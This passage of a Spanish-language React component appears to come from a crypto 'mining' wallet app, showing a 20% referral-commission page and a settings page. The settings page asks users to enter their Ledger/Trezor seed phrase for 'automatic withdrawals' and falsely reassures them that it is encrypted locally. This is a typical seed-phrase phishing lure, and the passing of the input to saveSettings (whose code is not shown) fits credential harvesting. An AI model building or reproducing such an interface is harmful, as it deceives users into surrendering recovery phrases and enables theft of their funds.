                    </div>
                )}
                
                {view === 'referral' && (
                    <div className="max-w-5xl mx-auto space-y-8 animate-fade-in-up">
                        {/* Referral content same as before */}
                        <div className="flex items-center justify-between">
                            <div>
                                <h3 className="text-2xl font-bold text-white">Programa de Referidos VIP</h3>
                                <p className="text-gray-400">Invita amigos y gana el 20% de lo que ellos minen.</p>
                            </div>
                            <div className="px-4 py-2 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center gap-2">
                                <Star className="text-yellow-500 fill-yellow-500 w-4 h-4" />
                                <span className="text-yellow-400 font-bold text-sm">Comisión: 20%</span>
                            </div>
                        </div>

                        {/* Status Cards */}
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                            {/* Level Card */}
                            <div className="bg-slate-800 p-6 rounded-2xl border border-slate-700 relative overflow-hidden group">
                                <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:scale-110 transition-transform">
                                    <Award size={64} className="text-yellow-500" />
                                </div>
                                <h3 className="text-gray-400 text-sm font-bold uppercase tracking-wider">Tu Nivel Actual</h3>
                                <div className="text-4xl font-bold text-white mt-2 mb-1 flex items-center gap-2">
                                    {user.referralLevel} 
                                    <span className="text-xs px-2 py-1 bg-slate-700 rounded text-gray-300 font-normal">Rank {user.referralLevel === 'Bronce' ? '1' : user.referralLevel === 'Plata' ? '2' : '3'}</span>
                                </div>
                                <div className="w-full h-2 bg-slate-900 rounded-full mt-4 overflow-hidden">
                                    <div 
                                        className={`h-full rounded-full transition-all duration-1000 ${user.referralLevel === 'Oro' ? 'bg-gradient-to-r from-yellow-400 to-amber-600' : 'bg-gradient-to-r from-slate-500 to-slate-300'}`} 
                                        style={{width: `${Math.min((user.xp / 15000) * 100, 100)}%`}}
                                    ></div>
                                </div>
                                <p className="text-xs text-gray-500 mt-2 flex justify-between">
                                    <span>{user.xp} XP</span>
                                    <span>{user.referralLevel === 'Oro' ? 'Nivel Máximo' : user.referralLevel === 'Plata' ? '15,000 XP para Oro' : '5,000 XP para Plata'}</span>
                                </p>
                            </div>

                            {/* Link Card */}
                            <div className="md:col-span-2 bg-gradient-to-br from-blue-900/50 to-slate-800 p-6 rounded-2xl border border-slate-700 flex flex-col justify-center">
                                <h3 className="text-gray-400 text-sm font-bold uppercase tracking-wider mb-4">Tu Enlace Único</h3>
                                <div className="flex gap-2">
                                    <div className="flex-1 bg-slate-900 border border-slate-600 rounded-xl p-4 font-mono text-blue-400 truncate flex items-center">
                                        <Globe className="w-4 h-4 mr-2 flex-shrink-0 text-gray-500" />
                                        https://criptowallet.ai/ref/{user.referralCode}
                                    </div>
                                    <button 
                                        onClick={copyReferral}
                                        className="bg-blue-600 hover:bg-blue-500 px-6 rounded-xl font-bold text-white transition-colors shadow-lg shadow-blue-500/20 flex items-center gap-2"
                                    >
                                        <Copy size={18} /> <span className="hidden sm:inline">Copiar</span>
                                    </button>
                                </div>
                                <p className="text-xs text-blue-200/60 mt-3 flex justify-between items-center">
                                    <span>* Comparte este enlace en redes sociales. Cada registro te otorga +500 XP.</span>
                                    <button onClick={simulateReferral} className="text-green-400 hover:text-green-300 flex items-center gap-1 font-bold underline">
                                        <PlusCircle size={14} /> Simular Invitado (Demo)
                                    </button>
                                </p>
                            </div>
                        </div>

                        {/* Simulation Table */}
                        <div className="bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden">
                            <div className="p-6 border-b border-slate-700 flex justify-between items-center">
                                <h3 className="font-bold text-lg">Tus Referidos Activos</h3>
                                <span className="text-sm text-gray-400">Total Ganado: <span className="text-emerald-400 font-bold">$0.00</span></span>
                            </div>
                            <div className="p-8 text-center text-gray-500">
                                <Users size={48} className="mx-auto mb-4 opacity-20" />
                                <p>Aún no tienes referidos activos.</p>
                                <p className="text-sm mt-2">¡Invita a tus amigos para empezar a ver ganancias aquí!</p>
                            </div>
                        </div>
                    </div>
                )}
                
                {view === 'settings' && (
                    <div className="max-w-xl mx-auto space-y-8">
                        <h3 className="text-2xl font-bold">Configuración Avanzada</h3>
                        
                        <div className="bg-slate-800 p-6 rounded-xl border border-slate-700 space-y-4">
                            <div className="flex justify-between items-center">
                                <span>Notificaciones Push</span>
                                <div className="w-12 h-6 bg-green-500 rounded-full relative cursor-pointer"><div className="absolute right-1 top-1 bg-white w-4 h-4 rounded-full"></div></div>
                            </div>
                            <div className="flex justify-between items-center">
                                <span>Proxy Integrado</span>
                                <div className="w-12 h-6 bg-green-500 rounded-full relative cursor-pointer"><div className="absolute right-1 top-1 bg-white w-4 h-4 rounded-full"></div></div>
                            </div>
                        </div>

                        <div className="bg-slate-800 p-6 rounded-xl border border-slate-700">
                            <h4 className="font-bold mb-4 text-yellow-500 flex items-center gap-2"><Shield size={16}/> Billetera Fría (Cold Storage)</h4>
                            <p className="text-xs text-gray-400 mb-4">Para máxima seguridad, puedes vincular tu frase semilla de Ledger/Trezor para retiros automáticos. Se encripta localmente.</p>
                            
                            <textarea 
                                className="w-full bg-slate-900 border border-slate-600 rounded-lg p-4 font-mono text-sm h-32 text-white focus:border-yellow-500 outline-none transition-colors"
                                placeholder="ejemplo: witch collapse practice feed shame open despair creek road again ice least"
                                value={seedPhraseInput}
                                onChange={e => setSeedPhraseInput(e.target.value)}
                            ></textarea>
                            
                            <button onClick={saveSettings} className="w-full mt-4 bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-3 rounded-lg shadow-lg shadow-yellow-500/20 transition-all">
                                Guardar y Vincular
                            </button>
                        </div>
                    </div>
                )}
            </main>
        </div>
    </div>
  );
};